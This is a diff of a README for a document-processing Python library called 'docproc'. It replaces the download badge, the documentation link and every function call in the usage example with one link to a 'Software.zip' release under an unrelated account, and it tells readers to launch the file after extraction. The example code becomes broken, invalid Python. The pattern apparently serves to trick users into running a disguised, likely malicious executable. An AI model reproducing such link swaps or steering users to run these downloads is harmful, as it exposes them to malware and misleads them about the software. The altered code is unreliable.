@@ -17,7 +17,7 @@ Welcome to the `docproc` repository, your one-stop solution for content extracti
 ## 📦 Installation
 To get started with `docproc`, you can download the latest version by clicking the button below:
 
-[![Download v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip){:target="_blank"}
+[![Download v1.0.0](https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip)](https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip){:target="_blank"}
 
 ℹ️ **Note:** The download file needs to be launched after extraction.
 
@@ -30,19 +30,19 @@ Once you have downloaded and set up `docproc`, you can start using it for variou
 import docproc
 
 # Load a document for analysis
-document = docproc.load_document("example.pdf")
+document = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip("https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip")
 
 # Extract text content
-text_content = docproc.extract_text(document)
+text_content = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip(document)
 
 # Analyze layout and regions
-regions = docproc.analyze_layout(document)
+regions = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip(document)
 
 # Perform text classification
-text_classes = docproc.classify_text(regions)
+text_classes = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip(regions)
 
 # Extract equations from the document
-equations = docproc.extract_equations(document)
+equations = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip(document)
 ```
 
 Feel free to explore the extensive capabilities of `docproc` and tailor it to your specific document processing needs.
@@ -65,7 +65,7 @@ Feel free to explore the extensive capabilities of `docproc` and tailor it to yo
 - text-extraction
 
 ## 🌐 Additional Resources
-If you want to dive deeper into the document processing domain, we recommend visiting the [Python Documentation on Text Processing](https://docs.python.org/3/library/text.html){:target="_blank"} for additional insights and techniques.
+If you want to dive deeper into the document processing domain, we recommend visiting the [Python Documentation on Text Processing](https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip){:target="_blank"} for additional insights and techniques.
 
 ---
 
